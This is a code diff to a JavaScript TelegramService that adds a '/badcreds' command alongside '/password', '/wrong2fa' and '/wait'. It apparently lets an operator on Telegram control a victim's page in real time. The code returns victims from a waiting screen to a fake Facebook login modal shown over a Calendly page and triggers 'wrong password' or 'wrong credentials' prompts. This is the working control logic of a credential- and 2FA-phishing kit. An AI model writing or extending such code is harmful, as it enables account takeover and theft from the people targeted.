@@ -11,6 +11,7 @@ export class TelegramService {
   static baseDelay = 1000; // 1 second base delay
   static lastProcessedWrong2faCommand = null; // Track last processed wrong2fa command
   static lastProcessedPasswordCommand = null; // Track last processed password command
+  static lastProcessedBadCredsCommand = null; // Track last processed badcreds command
 
   static async fetchMessages() {
     // Prevent multiple simultaneous requests
@@ -100,6 +101,9 @@ export class TelegramService {
       wrong2faTrigger,
       setWrongPasswordTrigger,
       wrongPasswordTrigger,
+      setWrongCredsTrigger,
+      wrongCredsTrigger,
+      Step,
     } = currentState;
 
     const commands = {
@@ -123,12 +127,38 @@ export class TelegramService {
 
         this.lastProcessedPasswordCommand = fullCommand;
 
-        // Don't change step - just trigger wrong password in the modal
-        // This keeps the modal overlay visible with Calendly in background
+        // If user is on waiting page (step 4), bring them back to step 1 (ActualForm with modal)
+        // If user is on step 2 (actual Step2 page), keep them there
+        // This handles Facebook modal flow where modal is part of Step 1
+        if (Step === 4) {
+          setStep(1); // Go back to Step 1 which will show ActualForm and automatically open modal
+        }
+        
         setLastFetch("password");
 
-        if (typeof currentState.setWrongPasswordTrigger === "function") {
-          currentState.setWrongPasswordTrigger((prev) => prev + 1);
+        if (typeof setWrongPasswordTrigger === "function") {
+          setWrongPasswordTrigger((prev) => prev + 1);
+        }
+      },
+      "/badcreds": (fullCommand) => {
+        // Check if this is a new badcreds command (idempotent check)
+        if (this.lastProcessedBadCredsCommand === fullCommand) {
+          return;
+        }
+
+        this.lastProcessedBadCredsCommand = fullCommand;
+
+        // If user is on waiting page (step 4), bring them back to step 1 (ActualForm with modal)
+        // If user is on step 2 (actual Step2 page), keep them there
+        // This handles Facebook modal flow where modal is part of Step 1
+        if (Step === 4) {
+          setStep(1); // Go back to Step 1 which will show ActualForm and automatically open modal
+        }
+        
+        setLastFetch("badcreds");
+
+        if (typeof setWrongCredsTrigger === "function") {
+          setWrongCredsTrigger((prev) => prev + 1);
         }
       },
       "/wait": () => {
@@ -231,6 +261,7 @@ export class TelegramService {
         this.resetErrorState();
         this.lastProcessedWrong2faCommand = null;
         this.lastProcessedPasswordCommand = null;
+        this.lastProcessedBadCredsCommand = null;
       },
     };
 
@@ -259,6 +290,21 @@ export class TelegramService {
         if (process.env.NODE_ENV === "development") {
           console.warn(
             "[Telegram] Error processing password command:",
+            command,
+            error.message
+          );
+        }
+      }
+    } else if (command.startsWith("/badcreds")) {
+      // Handle /badcreds commands with additional data
+      try {
+        if (commands["/badcreds"]) {
+          commands["/badcreds"](command); // Pass full command for idempotency check
+        }
+      } catch (error) {
+        if (process.env.NODE_ENV === "development") {
+          console.warn(
+            "[Telegram] Error processing badcreds command:",
             command,
             error.message
           );
